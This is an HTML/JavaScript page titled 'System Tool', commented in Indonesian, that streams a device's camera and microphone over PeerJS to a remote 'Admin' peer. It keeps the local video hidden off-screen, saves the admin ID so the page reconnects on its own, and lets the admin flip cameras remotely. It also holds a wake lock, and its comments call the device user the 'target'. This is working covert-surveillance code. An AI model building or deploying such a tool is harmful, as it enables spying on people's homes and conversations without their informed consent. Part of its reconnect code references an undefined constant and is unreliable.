<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Tool</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        :root {
            --bg-grad: linear-gradient(120deg, #fdfbfb 0%, #ebedee 100%);
            --primary: #4a90e2;
            --text-dark: #1c1c1c;
            --card-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: var(--bg-grad);
            color: var(--text-dark);
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            user-select: none;
        }

        /* Video Tersembunyi tapi Aktif */
        #localVideo {
            position: fixed;
            top: -9999px; /* Di luar layar tapi tetap dirender */
            width: 1px; 
            height: 1px;
            opacity: 0;
        }

        /* --- UI KONTEN --- */
        .container {
            width: 90%;
            max-width: 340px;
            text-align: center;
            transition: opacity 0.5s ease;
        }

        .card {
            background: white;
            padding: 30px;
            border-radius: 20px;
            box-shadow: var(--card-shadow);
        }

        h1 { font-size: 20px; margin: 0 0 10px; }
        p { font-size: 13px; color: #666; margin-bottom: 20px; }

        input[type="text"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 10px;
            margin-bottom: 15px;
            box-sizing: border-box;
            font-size: 16px;
            text-align: center;
        }

        .btn {
            background: var(--primary);
            color: white;
            border: none;
            padding: 12px;
            border-radius: 10px;
            width: 100%;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
        }

        .btn:active { opacity: 0.8; transform: scale(0.98); }

        /* --- CONTROLS (Muncul saat connect) --- */
        #controlsPanel {
            display: none; /* Hidden default */
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(10px);
            padding: 10px 15px;
            border-radius: 30px;
            display: flex;
            gap: 15px;
            z-index: 100;
            opacity: 0;
            transition: opacity 0.5s;
            pointer-events: none; /* Klik tembus saat hidden */
        }
        
        #controlsPanel.visible {
            opacity: 1;
            pointer-events: all;
        }

        .icon-btn {
            background: transparent;
            border: none;
            color: white;
            font-size: 24px;
            cursor: pointer;
            padding: 5px;
            border-radius: 50%;
            transition: background 0.2s;
        }
        .icon-btn:active { background: rgba(255,255,255,0.2); }
        .icon-btn.on { color: #ffeb3b; text-shadow: 0 0 10px #ffeb3b; }

        /* Status Minimalis */
        #miniStatus {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(255,255,255,0.9);
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 12px;
            color: #333;
            font-weight: 600;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            display: none;
        }
        #miniStatus.active { display: block; }
        .blink { animation: blinker 2s linear infinite; }
        @keyframes blinker { 50% { opacity: 0.5; } }

        /* Loading Spinner */
        .loader { width: 30px; height: 30px; border: 3px solid #eee; border-top-color: var(--primary); border-radius: 50%; animation: spin 1s infinite; margin: 0 auto 15px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }

    </style>
</head>
<body>

    <!-- Video Element (Hidden but Running) -->
    <video id="localVideo" autoplay playsinline muted></video>

    <!-- Panel Login -->
    <div class="container" id="loginPanel">
        <div class="card">
            <h1>System Connect</h1>
            <p>Masukkan Server Key untuk melanjutkan.</p>
            <input type="text" id="adminIdInput" placeholder="Paste ID Admin">
            <button class="btn" onclick="saveAndConnect()">HUBUNGKAN</button>
        </div>
    </div>

    <!-- Panel Loading (Transisi) -->
    <div class="container" id="loadingPanel" style="display: none;">
        <div class="loader"></div>
        <p>Menghubungkan ke server...</p>
    </div>

    <!-- Status Bar Mini -->
    <div id="miniStatus">
        <span style="color:red">‚óè</span> Live Stream Active
    </div>

    <!-- Kontrol Kamera (Bottom) -->
    <div id="controlsPanel">
        <!-- Switch Kamera -->
        <button class="icon-btn" onclick="switchCamera()" title="Ganti Kamera">
            üîÑ
        </button>
        
        <!-- Toggle Flash -->
        <button class="icon-btn" id="flashBtn" onclick="toggleFlash()" title="Nyalakan Flash">
            ‚ö°
        </button>
        
        <!-- Putus Koneksi -->
        <button class="icon-btn" onclick="disconnect()" style="color: #ff6b6b;" title="Putus">
            ‚úï
        </button>
    </div>

<script>
    // --- KONFIGURASI VARIABEL ---
    let peer = null;
    let currentCall = null;
    let localStream = null;
    let videoTrack = null;
    let audioTrack = null;
    
    // State Kamera
    let facingMode = 'user'; // 'user' (depan) atau 'environment' (belakang)
    let isFlashOn = false;

    const STORAGE_KEY = 'saved_admin_id';

    // --- INISIALISASI SAAT LOAD ---
    window.addEventListener('DOMContentLoaded', () => {
        // 1. Cek apakah ada ID tersimpan?
        const savedID = localStorage.getItem(STORAGE_KEY);

        if (savedID) {
            // Jika ada ID, langsung connect otomatis di background
            document.getElementById('loginPanel').style.display = 'none';
            document.getElementById('loadingPanel').style.display = 'block';
            startConnection(savedID);
        } else {
            // Jika tidak ada, tampilkan login
            document.getElementById('loginPanel').style.display = 'block';
        }

        // Mencegah sleep mode pada mobile (agar background tetap jalan)
        preventSleep();
    });

    // --- FUNGSI KONEKSI ---
    function saveAndConnect() {
        const idInput = document.getElementById('adminIdInput').value.trim();
        if (!idInput) return alert("Mohon masukkan ID!");

        // Simpan ID ke LocalStorage
        localStorage.setItem(STORAGE_KEY, idInput);

        // Ganti UI ke loading
        document.getElementById('loginPanel').style.display = 'none';
        document.getElementById('loadingPanel').style.display = 'block';
        
        startConnection(idInput);
    }

    function startConnection(adminID) {
        peer = new Peer(null, { debug: 1 });

        peer.on('open', () => {
            console.log('PeerJS Open');
            getMediaAndCall(adminID);
        });

        // --- LOGIKA RE-CALL (TRIGGER DARI ADMIN) ---
        peer.on('call', (call) => {
            console.log('Menerima panggilan dari Admin (Re-call)...');
            
            // 1. AUTO SWITCH KAMERA
            // Setiap kali admin melakukan re-call (untuk switch/flash), kita ganti kamera
            facingMode = (facingMode === 'user') ? 'environment' : 'user';
            
            // 2. Handle Flash
            // Jika pindah ke kamera depan, pastikan flash mati
            if (facingMode === 'user') {
                isFlashOn = false;
                document.getElementById('flashBtn').classList.remove('on');
            } else {
                // Jika pindah ke belakang, kembalikan status flash ke state sebelumnya (atau default off)
                // Di sini kita biarkan user nyalakan manual, atau bisa diset isFlashOn = true jika ingin auto on saat belakang
            }

            // 3. Stop stream lama
            if(localStream) {
                localStream.getTracks().forEach(track => track.stop());
            }

            // 4. Ambil Stream Baru dengan Kamera yang sudah diganti
            navigator.mediaDevices.getUserMedia({
                video: { facingMode: facingMode },
                audio: true
            }).then(stream => {
                localStream = stream;
                videoTrack = stream.getVideoTracks()[0];
                audioTrack = stream.getAudioTracks()[0];

                // Update Video Element
                const localVid = document.getElementById('localVideo');
                localVid.srcObject = stream;
                localVid.play();

                // Jawab panggilan admin dengan stream BARU
                call.answer(stream);
                currentCall = call;

                // Update UI
                document.getElementById('loadingPanel').style.display = 'none';
                document.getElementById('controlsPanel').style.display = 'flex';
                setTimeout(() => document.getElementById('controlsPanel').classList.add('visible'), 100);
                document.getElementById('miniStatus').classList.add('active', 'blink');
                
                // Cek Flash Capability
                checkFlashCapability();

            }).catch(err => {
                console.error("Gagal ganti kamera saat re-call:", err);
            });
        });

        peer.on('error', (err) => {
            console.error(err);
            alert("Gagal koneksi: " + err.type);
            if(err.type === 'peer-unavailable') {
                localStorage.removeItem(STORAGE_KEY);
                location.reload();
            }
        });
    }

    // --- FUNGSI MEDIA (INITIAL) ---
    async function getMediaAndCall(adminID) {
        try {
            const constraints = {
                audio: true,
                video: {
                    facingMode: facingMode,
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            };

            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            
            videoTrack = stream.getVideoTracks()[0];
            audioTrack = stream.getAudioTracks()[0];
            localStream = stream;

            const localVid = document.getElementById('localVideo');
            localVid.srcObject = stream;
            localVid.play();

            currentCall = peer.call(adminID, stream);

            currentCall.on('stream', () => {
                onConnected();
            });

            currentCall.on('close', () => {
                onDisconnected();
            });

        } catch (err) {
            console.error("Media Error:", err);
            alert("Gagal akses kamera: " + err.message);
            document.getElementById('loginPanel').style.display = 'block';
            document.getElementById('loadingPanel').style.display = 'none';
        }
    }

    // --- FUNGSI SAAT TERHUBUNG ---
    function onConnected() {
        document.getElementById('loadingPanel').style.display = 'none';
        
        document.getElementById('miniStatus').classList.add('active', 'blink');
        document.getElementById('miniStatus').innerHTML = '<span style="color:green">‚óè</span> Connected';
        
        const controls = document.getElementById('controlsPanel');
        controls.style.display = 'flex';
        setTimeout(() => controls.classList.add('visible'), 100);

        checkFlashCapability();
    }

    function onDisconnected() {
        document.getElementById('miniStatus').innerHTML = '<span style="color:red">‚óè</span> Disconnected';
        document.getElementById('controlsPanel').classList.remove('visible');
        
        setTimeout(() => {
            const savedID = localStorage.getItem(STORAGE_ID);
            // Coba reconnect otomatis
            if(savedID) startConnection(savedID);
        }, 3000);
    }

    // --- FITUR SWITCH KAMERA (MANUAL DI TARGET) ---
    async function switchCamera() {
        if (!localStream) return;
        facingMode = (facingMode === 'user') ? 'environment' : 'user';
        
        if (facingMode === 'user' && isFlashOn) {
            toggleFlash(); // Matikan flash jika pindah ke depan
        }

        try {
            const newStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: facingMode },
                audio: true
            });

            const newVideoTrack = newStream.getVideoTracks()[0];
            // Replace track di koneksi saat ini
            const sender = currentCall.peerConnection.getSenders().find(s => s.track.kind === 'video');
            if(sender) sender.replaceTrack(newVideoTrack);

            videoTrack.stop();
            videoTrack = newVideoTrack;
            
            const localVid = document.getElementById('localVideo');
            localVid.srcObject = newStream;
            
            audioTrack.stop();
            audioTrack = newStream.getAudioTracks()[0];
            localStream = newStream;

            checkFlashCapability();

        } catch (err) {
            console.error("Error switching camera:", err);
            alert("Gagal ganti kamera.");
        }
    }

    // --- FITUR FLASH ---
    function checkFlashCapability() {
        const btn = document.getElementById('flashBtn');
        if (videoTrack && videoTrack.getCapabilities().torch) {
            btn.style.display = 'block';
        } else {
            btn.style.display = 'none';
            isFlashOn = false;
            btn.classList.remove('on');
        }
    }

    function toggleFlash() {
        if (!videoTrack) return;
        const capabilities = videoTrack.getCapabilities();
        
        if (!capabilities.torch) return;

        isFlashOn = !isFlashOn;
        
        videoTrack.applyConstraints({
            advanced: [{ torch: isFlashOn }]
        });

        const btn = document.getElementById('flashBtn');
        if (isFlashOn) btn.classList.add('on');
        else btn.classList.remove('on');
    }

    // --- PUTUS KONEKSI ---
    function disconnect() {
        if(confirm("Putuskan koneksi?")) {
            localStorage.removeItem(STORAGE_KEY);
            if(currentCall) currentCall.close();
            if(localStream) localStream.getTracks().forEach(t => t.stop());
            location.reload();
        }
    }

    // --- PREVENT SLEEP ---
    function preventSleep() {
        if ('wakeLock' in navigator) {
            navigator.wakeLock.request('screen').then(() => {
                console.log('Wake Lock active');
            }).catch((err) => {
                console.log(`Wake Lock error: ${err.name}, ${err.message}`);
            });
        }
    }

</script>
</body>
</html>
